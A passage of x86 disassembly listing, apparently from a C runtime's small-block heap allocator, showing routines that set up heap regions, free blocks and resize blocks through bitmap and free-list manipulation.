  4266cc:	mov    DWORD PTR [ebp-0x1c],eax
  4266cf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4266d3:	call   0x4266e1
  4266d8:	mov    eax,DWORD PTR [ebp-0x1c]
  4266db:	call   0x42538b
  4266e0:	ret    
  4266e1:	push   0xc
  4266e3:	call   0x42547b
  4266e8:	pop    ecx
  4266e9:	ret    
  4266ea:	push   0x140
  4266ef:	push   0x0
  4266f1:	push   DWORD PTR ds:0x45e140
  4266f7:	call   DWORD PTR ds:0x429030
  4266fd:	test   eax,eax
  4266ff:	mov    ds:0x45df00,eax
  426704:	jne    0x426707
  426706:	ret    
  426707:	mov    ecx,DWORD PTR [esp+0x4]
  42670b:	and    DWORD PTR ds:0x45def8,0x0
  426712:	and    DWORD PTR ds:0x45defc,0x0
  426719:	mov    ds:0x45df08,eax
  42671e:	xor    eax,eax
  426720:	mov    DWORD PTR ds:0x45df04,ecx
  426726:	mov    DWORD PTR ds:0x45df0c,0x10
  426730:	inc    eax
  426731:	ret    
  426732:	mov    eax,ds:0x45defc
  426737:	lea    ecx,[eax+eax*4]
  42673a:	mov    eax,ds:0x45df00
  42673f:	lea    ecx,[eax+ecx*4]
  426742:	jmp    0x426756
  426744:	mov    edx,DWORD PTR [esp+0x4]
  426748:	sub    edx,DWORD PTR [eax+0xc]
  42674b:	cmp    edx,0x100000
  426751:	jb     0x42675c
  426753:	add    eax,0x14
  426756:	cmp    eax,ecx
  426758:	jb     0x426744
  42675a:	xor    eax,eax
  42675c:	ret    
  42675d:	push   ebp
  42675e:	mov    ebp,esp
  426760:	sub    esp,0x10
  426763:	mov    ecx,DWORD PTR [ebp+0x8]
  426766:	mov    eax,DWORD PTR [ecx+0x10]
  426769:	push   esi
  42676a:	mov    esi,DWORD PTR [ebp+0xc]
  42676d:	push   edi
  42676e:	mov    edi,esi
  426770:	sub    edi,DWORD PTR [ecx+0xc]
  426773:	add    esi,0xfffffffc
  426776:	shr    edi,0xf
  426779:	mov    ecx,edi
  42677b:	imul   ecx,ecx,0x204
  426781:	lea    ecx,[ecx+eax*1+0x144]
  426788:	mov    DWORD PTR [ebp-0x10],ecx
  42678b:	mov    ecx,DWORD PTR [esi]
  42678d:	dec    ecx
  42678e:	test   cl,0x1
  426791:	mov    DWORD PTR [ebp-0x4],ecx
  426794:	jne    0x426a71
  42679a:	push   ebx
  42679b:	lea    ebx,[ecx+esi*1]
  42679e:	mov    edx,DWORD PTR [ebx]
  4267a0:	mov    DWORD PTR [ebp-0xc],edx
  4267a3:	mov    edx,DWORD PTR [esi-0x4]
  4267a6:	mov    DWORD PTR [ebp-0x8],edx
  4267a9:	mov    edx,DWORD PTR [ebp-0xc]
  4267ac:	test   dl,0x1
  4267af:	mov    DWORD PTR [ebp+0xc],ebx
  4267b2:	jne    0x426828
  4267b4:	sar    edx,0x4
  4267b7:	dec    edx
  4267b8:	cmp    edx,0x3f
  4267bb:	jbe    0x4267c0
  4267bd:	push   0x3f
  4267bf:	pop    edx
  4267c0:	mov    ecx,DWORD PTR [ebx+0x4]
  4267c3:	cmp    ecx,DWORD PTR [ebx+0x8]
  4267c6:	jne    0x42680a
  4267c8:	cmp    edx,0x20
  4267cb:	mov    ebx,0x80000000
  4267d0:	jae    0x4267eb
  4267d2:	mov    ecx,edx
  4267d4:	shr    ebx,cl
  4267d6:	lea    ecx,[edx+eax*1+0x4]
  4267da:	not    ebx
  4267dc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4267e0:	dec    BYTE PTR [ecx]
  4267e2:	jne    0x426807
  4267e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e7:	and    DWORD PTR [ecx],ebx
  4267e9:	jmp    0x426807
  4267eb:	lea    ecx,[edx-0x20]
  4267ee:	shr    ebx,cl
  4267f0:	lea    ecx,[edx+eax*1+0x4]
  4267f4:	not    ebx
  4267f6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  4267fd:	dec    BYTE PTR [ecx]
  4267ff:	jne    0x426807
  426801:	mov    ecx,DWORD PTR [ebp+0x8]
  426804:	and    DWORD PTR [ecx+0x4],ebx
  426807:	mov    ebx,DWORD PTR [ebp+0xc]
  42680a:	mov    edx,DWORD PTR [ebx+0x8]
  42680d:	mov    ebx,DWORD PTR [ebx+0x4]
  426810:	mov    ecx,DWORD PTR [ebp-0x4]
  426813:	add    ecx,DWORD PTR [ebp-0xc]
  426816:	mov    DWORD PTR [edx+0x4],ebx
  426819:	mov    edx,DWORD PTR [ebp+0xc]
  42681c:	mov    ebx,DWORD PTR [edx+0x4]
  42681f:	mov    edx,DWORD PTR [edx+0x8]
  426822:	mov    DWORD PTR [ebx+0x8],edx
  426825:	mov    DWORD PTR [ebp-0x4],ecx
  426828:	mov    edx,ecx
  42682a:	sar    edx,0x4
  42682d:	dec    edx
  42682e:	cmp    edx,0x3f
  426831:	jbe    0x426836
  426833:	push   0x3f
  426835:	pop    edx
  426836:	mov    ebx,DWORD PTR [ebp-0x8]
  426839:	and    ebx,0x1
  42683c:	mov    DWORD PTR [ebp-0xc],ebx
  42683f:	jne    0x4268d4
  426845:	sub    esi,DWORD PTR [ebp-0x8]
  426848:	mov    ebx,DWORD PTR [ebp-0x8]
  42684b:	sar    ebx,0x4
  42684e:	push   0x3f
  426850:	mov    DWORD PTR [ebp+0xc],esi
  426853:	dec    ebx
  426854:	pop    esi
  426855:	cmp    ebx,esi
  426857:	jbe    0x42685b
  426859:	mov    ebx,esi
  42685b:	add    ecx,DWORD PTR [ebp-0x8]
  42685e:	mov    edx,ecx
  426860:	sar    edx,0x4
  426863:	dec    edx
  426864:	cmp    edx,esi
  426866:	mov    DWORD PTR [ebp-0x4],ecx
  426869:	jbe    0x42686d
  42686b:	mov    edx,esi
  42686d:	cmp    ebx,edx
  42686f:	je     0x4268cf
  426871:	mov    ecx,DWORD PTR [ebp+0xc]
  426874:	mov    esi,DWORD PTR [ecx+0x4]
  426877:	cmp    esi,DWORD PTR [ecx+0x8]
  42687a:	jne    0x4268b7
  42687c:	cmp    ebx,0x20
  42687f:	mov    esi,0x80000000
  426884:	jae    0x42689d
  426886:	mov    ecx,ebx
  426888:	shr    esi,cl
  42688a:	not    esi
  42688c:	and    DWORD PTR [eax+edi*4+0x44],esi
  426890:	dec    BYTE PTR [ebx+eax*1+0x4]
  426894:	jne    0x4268b7
  426896:	mov    ecx,DWORD PTR [ebp+0x8]
  426899:	and    DWORD PTR [ecx],esi
  42689b:	jmp    0x4268b7
  42689d:	lea    ecx,[ebx-0x20]
  4268a0:	shr    esi,cl
  4268a2:	not    esi
  4268a4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  4268ab:	dec    BYTE PTR [ebx+eax*1+0x4]
  4268af:	jne    0x4268b7
  4268b1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268b4:	and    DWORD PTR [ecx+0x4],esi
  4268b7:	mov    ecx,DWORD PTR [ebp+0xc]
  4268ba:	mov    esi,DWORD PTR [ecx+0x8]
  4268bd:	mov    ecx,DWORD PTR [ecx+0x4]
  4268c0:	mov    DWORD PTR [esi+0x4],ecx
  4268c3:	mov    ecx,DWORD PTR [ebp+0xc]
  4268c6:	mov    esi,DWORD PTR [ecx+0x4]
  4268c9:	mov    ecx,DWORD PTR [ecx+0x8]
  4268cc:	mov    DWORD PTR [esi+0x8],ecx
  4268cf:	mov    esi,DWORD PTR [ebp+0xc]
  4268d2:	jmp    0x4268d7
  4268d4:	mov    ebx,DWORD PTR [ebp+0x8]
  4268d7:	cmp    DWORD PTR [ebp-0xc],0x0
  4268db:	jne    0x4268e5
  4268dd:	cmp    ebx,edx
  4268df:	je     0x426965
  4268e5:	mov    ecx,DWORD PTR [ebp-0x10]
  4268e8:	lea    ecx,[ecx+edx*8]
  4268eb:	mov    ebx,DWORD PTR [ecx+0x4]
  4268ee:	mov    DWORD PTR [esi+0x8],ecx
  4268f1:	mov    DWORD PTR [esi+0x4],ebx
  4268f4:	mov    DWORD PTR [ecx+0x4],esi
  4268f7:	mov    ecx,DWORD PTR [esi+0x4]
  4268fa:	mov    DWORD PTR [ecx+0x8],esi
  4268fd:	mov    ecx,DWORD PTR [esi+0x4]
  426900:	cmp    ecx,DWORD PTR [esi+0x8]
  426903:	jne    0x426965
  426905:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  426909:	mov    BYTE PTR [ebp+0xf],cl
  42690c:	inc    cl
  42690e:	cmp    edx,0x20
  426911:	mov    BYTE PTR [edx+eax*1+0x4],cl
  426915:	jae    0x42693c
  426917:	cmp    BYTE PTR [ebp+0xf],0x0
  42691b:	jne    0x42692b
  42691d:	mov    ecx,edx
  42691f:	mov    ebx,0x80000000
  426924:	shr    ebx,cl
  426926:	mov    ecx,DWORD PTR [ebp+0x8]
  426929:	or     DWORD PTR [ecx],ebx
  42692b:	mov    ebx,0x80000000
  426930:	mov    ecx,edx
  426932:	shr    ebx,cl
  426934:	lea    eax,[eax+edi*4+0x44]
  426938:	or     DWORD PTR [eax],ebx
  42693a:	jmp    0x426965
  42693c:	cmp    BYTE PTR [ebp+0xf],0x0
  426940:	jne    0x426952
  426942:	lea    ecx,[edx-0x20]
  426945:	mov    ebx,0x80000000
  42694a:	shr    ebx,cl
  42694c:	mov    ecx,DWORD PTR [ebp+0x8]
  42694f:	or     DWORD PTR [ecx+0x4],ebx
  426952:	lea    ecx,[edx-0x20]
  426955:	mov    edx,0x80000000
  42695a:	shr    edx,cl
  42695c:	lea    eax,[eax+edi*4+0xc4]
  426963:	or     DWORD PTR [eax],edx
  426965:	mov    eax,DWORD PTR [ebp-0x4]
  426968:	mov    DWORD PTR [esi],eax
  42696a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  42696e:	mov    eax,DWORD PTR [ebp-0x10]
  426971:	dec    DWORD PTR [eax]
  426973:	jne    0x426a70
  426979:	mov    eax,ds:0x45def8
  42697e:	test   eax,eax
  426980:	je     0x426a62
  426986:	mov    ecx,DWORD PTR ds:0x45df10
  42698c:	mov    esi,DWORD PTR ds:0x4290b0
  426992:	push   0x4000
  426997:	shl    ecx,0xf
  42699a:	add    ecx,DWORD PTR [eax+0xc]
  42699d:	mov    ebx,0x8000
  4269a2:	push   ebx
  4269a3:	push   ecx
  4269a4:	call   esi
  4269a6:	mov    ecx,DWORD PTR ds:0x45df10
  4269ac:	mov    eax,ds:0x45def8
  4269b1:	mov    edx,0x80000000
  4269b6:	shr    edx,cl
  4269b8:	or     DWORD PTR [eax+0x8],edx
  4269bb:	mov    eax,ds:0x45def8
  4269c0:	mov    eax,DWORD PTR [eax+0x10]
  4269c3:	mov    ecx,DWORD PTR ds:0x45df10
  4269c9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  4269d1:	mov    eax,ds:0x45def8
  4269d6:	mov    eax,DWORD PTR [eax+0x10]
  4269d9:	dec    BYTE PTR [eax+0x43]
  4269dc:	mov    eax,ds:0x45def8
  4269e1:	mov    ecx,DWORD PTR [eax+0x10]
  4269e4:	cmp    BYTE PTR [ecx+0x43],0x0
  4269e8:	jne    0x4269f3
  4269ea:	and    DWORD PTR [eax+0x4],0xfffffffe
  4269ee:	mov    eax,ds:0x45def8
  4269f3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  4269f7:	jne    0x426a62
  4269f9:	push   ebx
  4269fa:	push   0x0
  4269fc:	push   DWORD PTR [eax+0xc]
  4269ff:	call   esi
  426a01:	mov    eax,ds:0x45def8
  426a06:	push   DWORD PTR [eax+0x10]
  426a09:	push   0x0
  426a0b:	push   DWORD PTR ds:0x45e140
  426a11:	call   DWORD PTR ds:0x429048
  426a17:	mov    eax,ds:0x45defc
  426a1c:	mov    edx,DWORD PTR ds:0x45df00
  426a22:	lea    eax,[eax+eax*4]
  426a25:	shl    eax,0x2
  426a28:	mov    ecx,eax
  426a2a:	mov    eax,ds:0x45def8
  426a2f:	sub    ecx,eax
  426a31:	lea    ecx,[ecx+edx*1-0x14]
  426a35:	push   ecx
  426a36:	lea    ecx,[eax+0x14]
  426a39:	push   ecx
  426a3a:	push   eax
  426a3b:	call   0x428290
  426a40:	mov    eax,DWORD PTR [ebp+0x8]
  426a43:	add    esp,0xc
  426a46:	dec    DWORD PTR ds:0x45defc
  426a4c:	cmp    eax,DWORD PTR ds:0x45def8
  426a52:	jbe    0x426a58
  426a54:	sub    DWORD PTR [ebp+0x8],0x14
  426a58:	mov    eax,ds:0x45df00
  426a5d:	mov    ds:0x45df08,eax
  426a62:	mov    eax,DWORD PTR [ebp+0x8]
  426a65:	mov    ds:0x45def8,eax
  426a6a:	mov    DWORD PTR ds:0x45df10,edi
  426a70:	pop    ebx
  426a71:	pop    edi
  426a72:	pop    esi
  426a73:	leave  
  426a74:	ret    
  426a75:	mov    eax,ds:0x45defc
  426a7a:	mov    ecx,DWORD PTR ds:0x45df0c
  426a80:	push   edi
  426a81:	xor    edi,edi
  426a83:	cmp    eax,ecx
  426a85:	jne    0x426abb
  426a87:	lea    eax,[ecx+ecx*4+0x50]
  426a8b:	shl    eax,0x2
  426a8e:	push   eax
  426a8f:	push   DWORD PTR ds:0x45df00
  426a95:	push   edi
  426a96:	push   DWORD PTR ds:0x45e140
  426a9c:	call   DWORD PTR ds:0x4290d4
  426aa2:	cmp    eax,edi
  426aa4:	jne    0x426aaa
  426aa6:	xor    eax,eax
  426aa8:	pop    edi
  426aa9:	ret    
  426aaa:	add    DWORD PTR ds:0x45df0c,0x10
  426ab1:	mov    ds:0x45df00,eax
  426ab6:	mov    eax,ds:0x45defc
  426abb:	mov    ecx,DWORD PTR ds:0x45df00
  426ac1:	push   esi
  426ac2:	push   0x41c4
  426ac7:	push   0x8
  426ac9:	push   DWORD PTR ds:0x45e140
  426acf:	lea    eax,[eax+eax*4]
  426ad2:	lea    esi,[ecx+eax*4]
  426ad5:	call   DWORD PTR ds:0x429030
  426adb:	cmp    eax,edi
  426add:	mov    DWORD PTR [esi+0x10],eax
  426ae0:	jne    0x426ae6
  426ae2:	xor    eax,eax
  426ae4:	jmp    0x426b29
  426ae6:	push   0x4
  426ae8:	push   0x2000
  426aed:	push   0x100000
  426af2:	push   edi
  426af3:	call   DWORD PTR ds:0x4290d0
  426af9:	cmp    eax,edi
  426afb:	mov    DWORD PTR [esi+0xc],eax
  426afe:	jne    0x426b12
  426b00:	push   DWORD PTR [esi+0x10]
  426b03:	push   edi
  426b04:	push   DWORD PTR ds:0x45e140
  426b0a:	call   DWORD PTR ds:0x429048
  426b10:	jmp    0x426ae2
  426b12:	or     DWORD PTR [esi+0x8],0xffffffff
  426b16:	mov    DWORD PTR [esi],edi
  426b18:	mov    DWORD PTR [esi+0x4],edi
  426b1b:	inc    DWORD PTR ds:0x45defc
  426b21:	mov    eax,DWORD PTR [esi+0x10]
  426b24:	or     DWORD PTR [eax],0xffffffff
  426b27:	mov    eax,esi
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	ret    
  426b2c:	push   ebp
  426b2d:	mov    ebp,esp
  426b2f:	push   ecx
  426b30:	push   ecx
  426b31:	mov    ecx,DWORD PTR [ebp+0x8]
  426b34:	mov    eax,DWORD PTR [ecx+0x8]
  426b37:	push   ebx
  426b38:	push   esi
  426b39:	mov    esi,DWORD PTR [ecx+0x10]
  426b3c:	push   edi
  426b3d:	xor    ebx,ebx
  426b3f:	jmp    0x426b44
  426b41:	shl    eax,1
  426b43:	inc    ebx
  426b44:	test   eax,eax
  426b46:	jge    0x426b41
  426b48:	mov    eax,ebx
  426b4a:	imul   eax,eax,0x204
  426b50:	lea    eax,[eax+esi*1+0x144]
  426b57:	push   0x3f
  426b59:	mov    DWORD PTR [ebp-0x8],eax
  426b5c:	pop    edx
  426b5d:	mov    DWORD PTR [eax+0x8],eax
  426b60:	mov    DWORD PTR [eax+0x4],eax
  426b63:	add    eax,0x8
  426b66:	dec    edx
  426b67:	jne    0x426b5d
  426b69:	push   0x4
  426b6b:	mov    edi,ebx
  426b6d:	push   0x1000
  426b72:	shl    edi,0xf
  426b75:	add    edi,DWORD PTR [ecx+0xc]
  426b78:	push   0x8000
  426b7d:	push   edi
  426b7e:	call   DWORD PTR ds:0x4290d0
  426b84:	test   eax,eax
  426b86:	jne    0x426b90
  426b88:	or     eax,0xffffffff
  426b8b:	jmp    0x426c2d
  426b90:	lea    edx,[edi+0x7000]
  426b96:	cmp    edi,edx
  426b98:	mov    DWORD PTR [ebp-0x4],edx
  426b9b:	ja     0x426be0
  426b9d:	mov    ecx,edx
  426b9f:	sub    ecx,edi
  426ba1:	shr    ecx,0xc
  426ba4:	lea    eax,[edi+0x10]
  426ba7:	inc    ecx
  426ba8:	or     DWORD PTR [eax-0x8],0xffffffff
  426bac:	or     DWORD PTR [eax+0xfec],0xffffffff
  426bb3:	lea    edx,[eax+0xffc]
  426bb9:	mov    DWORD PTR [eax],edx
  426bbb:	lea    edx,[eax-0x1004]
  426bc1:	mov    DWORD PTR [eax-0x4],0xff0
  426bc8:	mov    DWORD PTR [eax+0x4],edx
  426bcb:	mov    DWORD PTR [eax+0xfe8],0xff0
  426bd5:	add    eax,0x1000
  426bda:	dec    ecx
  426bdb:	jne    0x426ba8
  426bdd:	mov    edx,DWORD PTR [ebp-0x4]
  426be0:	mov    eax,DWORD PTR [ebp-0x8]
  426be3:	add    eax,0x1f8
  426be8:	lea    ecx,[edi+0xc]
  426beb:	mov    DWORD PTR [eax+0x4],ecx
  426bee:	mov    DWORD PTR [ecx+0x8],eax
  426bf1:	lea    ecx,[edx+0xc]
  426bf4:	mov    DWORD PTR [eax+0x8],ecx
  426bf7:	mov    DWORD PTR [ecx+0x4],eax
  426bfa:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426bff:	xor    edi,edi
  426c01:	inc    edi
  426c02:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426c09:	mov    al,BYTE PTR [esi+0x43]
  426c0c:	mov    cl,al
  426c0e:	inc    cl
  426c10:	test   al,al
  426c12:	mov    eax,DWORD PTR [ebp+0x8]
  426c15:	mov    BYTE PTR [esi+0x43],cl
  426c18:	jne    0x426c1d
  426c1a:	or     DWORD PTR [eax+0x4],edi
  426c1d:	mov    edx,0x80000000
  426c22:	mov    ecx,ebx
  426c24:	shr    edx,cl
  426c26:	not    edx
  426c28:	and    DWORD PTR [eax+0x8],edx
  426c2b:	mov    eax,ebx
  426c2d:	pop    edi
  426c2e:	pop    esi
  426c2f:	pop    ebx
  426c30:	leave  
  426c31:	ret    
  426c32:	push   ebp
  426c33:	mov    ebp,esp
  426c35:	sub    esp,0xc
  426c38:	mov    ecx,DWORD PTR [ebp+0x8]
  426c3b:	mov    eax,DWORD PTR [ecx+0x10]
  426c3e:	push   ebx
  426c3f:	push   esi
  426c40:	mov    esi,DWORD PTR [ebp+0x10]
  426c43:	push   edi
  426c44:	mov    edi,DWORD PTR [ebp+0xc]
  426c47:	mov    edx,edi
  426c49:	sub    edx,DWORD PTR [ecx+0xc]
  426c4c:	add    esi,0x17
  426c4f:	shr    edx,0xf
  426c52:	mov    ecx,edx
  426c54:	imul   ecx,ecx,0x204
  426c5a:	lea    ecx,[ecx+eax*1+0x144]
  426c61:	mov    DWORD PTR [ebp-0xc],ecx
  426c64:	mov    ecx,DWORD PTR [edi-0x4]
  426c67:	and    esi,0xfffffff0
  426c6a:	dec    ecx
  426c6b:	cmp    esi,ecx
  426c6d:	lea    edi,[ecx+edi*1-0x4]
  426c71:	mov    ebx,DWORD PTR [edi]
  426c73:	mov    DWORD PTR [ebp+0x10],ecx
  426c76:	mov    DWORD PTR [ebp-0x4],ebx
  426c79:	jle    0x426dd4
  426c7f:	test   bl,0x1
  426c82:	jne    0x426dcd
  426c88:	add    ebx,ecx
  426c8a:	cmp    esi,ebx
  426c8c:	jg     0x426dcd
  426c92:	mov    ecx,DWORD PTR [ebp-0x4]
  426c95:	sar    ecx,0x4
  426c98:	dec    ecx
  426c99:	cmp    ecx,0x3f
  426c9c:	mov    DWORD PTR [ebp-0x8],ecx
  426c9f:	jbe    0x426ca7
  426ca1:	push   0x3f
  426ca3:	pop    ecx
  426ca4:	mov    DWORD PTR [ebp-0x8],ecx
  426ca7:	mov    ebx,DWORD PTR [edi+0x4]
  426caa:	cmp    ebx,DWORD PTR [edi+0x8]
  426cad:	jne    0x426cf2
  426caf:	cmp    ecx,0x20
  426cb2:	mov    ebx,0x80000000
  426cb7:	jae    0x426cd3
  426cb9:	shr    ebx,cl
  426cbb:	mov    ecx,DWORD PTR [ebp-0x8]
  426cbe:	lea    ecx,[ecx+eax*1+0x4]
  426cc2:	not    ebx
  426cc4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426cc8:	dec    BYTE PTR [ecx]
  426cca:	jne    0x426cf2
  426ccc:	mov    ecx,DWORD PTR [ebp+0x8]
  426ccf:	and    DWORD PTR [ecx],ebx
  426cd1:	jmp    0x426cf2
  426cd3:	add    ecx,0xffffffe0
  426cd6:	shr    ebx,cl
  426cd8:	mov    ecx,DWORD PTR [ebp-0x8]
  426cdb:	lea    ecx,[ecx+eax*1+0x4]
  426cdf:	not    ebx
  426ce1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426ce8:	dec    BYTE PTR [ecx]
  426cea:	jne    0x426cf2
  426cec:	mov    ecx,DWORD PTR [ebp+0x8]
  426cef:	and    DWORD PTR [ecx+0x4],ebx
  426cf2:	mov    ecx,DWORD PTR [edi+0x8]
  426cf5:	mov    ebx,DWORD PTR [edi+0x4]
  426cf8:	mov    DWORD PTR [ecx+0x4],ebx
  426cfb:	mov    ecx,DWORD PTR [edi+0x4]
  426cfe:	mov    edi,DWORD PTR [edi+0x8]
  426d01:	mov    DWORD PTR [ecx+0x8],edi
  426d04:	mov    ecx,DWORD PTR [ebp+0x10]
  426d07:	sub    ecx,esi
  426d09:	add    DWORD PTR [ebp-0x4],ecx
  426d0c:	cmp    DWORD PTR [ebp-0x4],0x0
  426d10:	jle    0x426dbb
  426d16:	mov    edi,DWORD PTR [ebp-0x4]
  426d19:	mov    ecx,DWORD PTR [ebp+0xc]
  426d1c:	sar    edi,0x4
  426d1f:	dec    edi
  426d20:	cmp    edi,0x3f
  426d23:	lea    ecx,[ecx+esi*1-0x4]
  426d27:	jbe    0x426d2c
  426d29:	push   0x3f
  426d2b:	pop    edi
  426d2c:	mov    ebx,DWORD PTR [ebp-0xc]
  426d2f:	lea    ebx,[ebx+edi*8]
  426d32:	mov    DWORD PTR [ebp+0x10],ebx
  426d35:	mov    ebx,DWORD PTR [ebx+0x4]
  426d38:	mov    DWORD PTR [ecx+0x4],ebx
  426d3b:	mov    ebx,DWORD PTR [ebp+0x10]
  426d3e:	mov    DWORD PTR [ecx+0x8],ebx
  426d41:	mov    DWORD PTR [ebx+0x4],ecx
  426d44:	mov    ebx,DWORD PTR [ecx+0x4]
  426d47:	mov    DWORD PTR [ebx+0x8],ecx
  426d4a:	mov    ebx,DWORD PTR [ecx+0x4]
  426d4d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426d50:	jne    0x426da9
  426d52:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426d56:	mov    BYTE PTR [ebp+0x13],cl
  426d59:	inc    cl
  426d5b:	cmp    edi,0x20
  426d5e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426d62:	jae    0x426d80
  426d64:	cmp    BYTE PTR [ebp+0x13],0x0
  426d68:	jne    0x426d78
  426d6a:	mov    ecx,edi
  426d6c:	mov    ebx,0x80000000
  426d71:	shr    ebx,cl
  426d73:	mov    ecx,DWORD PTR [ebp+0x8]
  426d76:	or     DWORD PTR [ecx],ebx
  426d78:	lea    eax,[eax+edx*4+0x44]
  426d7c:	mov    ecx,edi
  426d7e:	jmp    0x426da0
  426d80:	cmp    BYTE PTR [ebp+0x13],0x0
  426d84:	jne    0x426d96
  426d86:	lea    ecx,[edi-0x20]
  426d89:	mov    ebx,0x80000000
  426d8e:	shr    ebx,cl
  426d90:	mov    ecx,DWORD PTR [ebp+0x8]
  426d93:	or     DWORD PTR [ecx+0x4],ebx
  426d96:	lea    eax,[eax+edx*4+0xc4]
  426d9d:	lea    ecx,[edi-0x20]
  426da0:	mov    edx,0x80000000
  426da5:	shr    edx,cl
  426da7:	or     DWORD PTR [eax],edx
  426da9:	mov    edx,DWORD PTR [ebp+0xc]
  426dac:	mov    ecx,DWORD PTR [ebp-0x4]
  426daf:	lea    eax,[edx+esi*1-0x4]
  426db3:	mov    DWORD PTR [eax],ecx
  426db5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426db9:	jmp    0x426dbe
  426dbb:	mov    edx,DWORD PTR [ebp+0xc]
  426dbe:	lea    eax,[esi+0x1]
  426dc1:	mov    DWORD PTR [edx-0x4],eax
  426dc4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426dc8:	jmp    0x426f09
  426dcd:	xor    eax,eax
  426dcf:	jmp    0x426f0c
  426dd4:	jge    0x426f09
  426dda:	mov    ebx,DWORD PTR [ebp+0xc]
  426ddd:	sub    DWORD PTR [ebp+0x10],esi
  426de0:	lea    ecx,[esi+0x1]
  426de3:	mov    DWORD PTR [ebx-0x4],ecx
  426de6:	lea    ebx,[ebx+esi*1-0x4]
  426dea:	mov    esi,DWORD PTR [ebp+0x10]
  426ded:	sar    esi,0x4
  426df0:	dec    esi
  426df1:	cmp    esi,0x3f
  426df4:	mov    DWORD PTR [ebp+0xc],ebx
  426df7:	mov    DWORD PTR [ebx-0x4],ecx
  426dfa:	jbe    0x426dff
  426dfc:	push   0x3f
  426dfe:	pop    esi
  426dff:	test   BYTE PTR [ebp-0x4],0x1
  426e03:	jne    0x426e89
  426e09:	mov    esi,DWORD PTR [ebp-0x4]
  426e0c:	sar    esi,0x4
  426e0f:	dec    esi
  426e10:	cmp    esi,0x3f
  426e13:	jbe    0x426e18
  426e15:	push   0x3f
  426e17:	pop    esi
  426e18:	mov    ecx,DWORD PTR [edi+0x4]
  426e1b:	cmp    ecx,DWORD PTR [edi+0x8]
  426e1e:	jne    0x426e62
  426e20:	cmp    esi,0x20
  426e23:	mov    ebx,0x80000000
  426e28:	jae    0x426e43
  426e2a:	mov    ecx,esi
  426e2c:	shr    ebx,cl
  426e2e:	lea    esi,[esi+eax*1+0x4]
  426e32:	not    ebx
  426e34:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426e38:	dec    BYTE PTR [esi]
  426e3a:	jne    0x426e5f
  426e3c:	mov    ecx,DWORD PTR [ebp+0x8]
  426e3f:	and    DWORD PTR [ecx],ebx
  426e41:	jmp    0x426e5f
  426e43:	lea    ecx,[esi-0x20]
  426e46:	shr    ebx,cl
  426e48:	lea    ecx,[esi+eax*1+0x4]
  426e4c:	not    ebx
  426e4e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426e55:	dec    BYTE PTR [ecx]
  426e57:	jne    0x426e5f
  426e59:	mov    ecx,DWORD PTR [ebp+0x8]
  426e5c:	and    DWORD PTR [ecx+0x4],ebx
  426e5f:	mov    ebx,DWORD PTR [ebp+0xc]
  426e62:	mov    ecx,DWORD PTR [edi+0x8]
  426e65:	mov    esi,DWORD PTR [edi+0x4]
  426e68:	mov    DWORD PTR [ecx+0x4],esi
  426e6b:	mov    esi,DWORD PTR [edi+0x8]
  426e6e:	mov    ecx,DWORD PTR [edi+0x4]
  426e71:	mov    DWORD PTR [ecx+0x8],esi
  426e74:	mov    esi,DWORD PTR [ebp+0x10]
  426e77:	add    esi,DWORD PTR [ebp-0x4]
  426e7a:	mov    DWORD PTR [ebp+0x10],esi
  426e7d:	sar    esi,0x4
  426e80:	dec    esi
  426e81:	cmp    esi,0x3f
  426e84:	jbe    0x426e89
  426e86:	push   0x3f
  426e88:	pop    esi
  426e89:	mov    ecx,DWORD PTR [ebp-0xc]
  426e8c:	lea    ecx,[ecx+esi*8]
  426e8f:	mov    edi,DWORD PTR [ecx+0x4]
  426e92:	mov    DWORD PTR [ebx+0x8],ecx
  426e95:	mov    DWORD PTR [ebx+0x4],edi
  426e98:	mov    DWORD PTR [ecx+0x4],ebx
  426e9b:	mov    ecx,DWORD PTR [ebx+0x4]
  426e9e:	mov    DWORD PTR [ecx+0x8],ebx
  426ea1:	mov    ecx,DWORD PTR [ebx+0x4]
  426ea4:	cmp    ecx,DWORD PTR [ebx+0x8]
  426ea7:	jne    0x426f00
  426ea9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426ead:	mov    BYTE PTR [ebp+0xf],cl
  426eb0:	inc    cl
  426eb2:	cmp    esi,0x20
  426eb5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426eb9:	jae    0x426ed7
  426ebb:	cmp    BYTE PTR [ebp+0xf],0x0
  426ebf:	jne    0x426ecf
  426ec1:	mov    ecx,esi
  426ec3:	mov    edi,0x80000000
  426ec8:	shr    edi,cl
  426eca:	mov    ecx,DWORD PTR [ebp+0x8]
  426ecd:	or     DWORD PTR [ecx],edi
  426ecf:	lea    eax,[eax+edx*4+0x44]
  426ed3:	mov    ecx,esi
  426ed5:	jmp    0x426ef7
  426ed7:	cmp    BYTE PTR [ebp+0xf],0x0
  426edb:	jne    0x426eed
  426edd:	lea    ecx,[esi-0x20]
  426ee0:	mov    edi,0x80000000
  426ee5:	shr    edi,cl
  426ee7:	mov    ecx,DWORD PTR [ebp+0x8]
  426eea:	or     DWORD PTR [ecx+0x4],edi
  426eed:	lea    eax,[eax+edx*4+0xc4]
  426ef4:	lea    ecx,[esi-0x20]
  426ef7:	mov    edx,0x80000000
  426efc:	shr    edx,cl
  426efe:	or     DWORD PTR [eax],edx
  426f00:	mov    eax,DWORD PTR [ebp+0x10]
  426f03:	mov    DWORD PTR [ebx],eax
  426f05:	mov    DWORD PTR [eax+ebx*1-0x4],eax
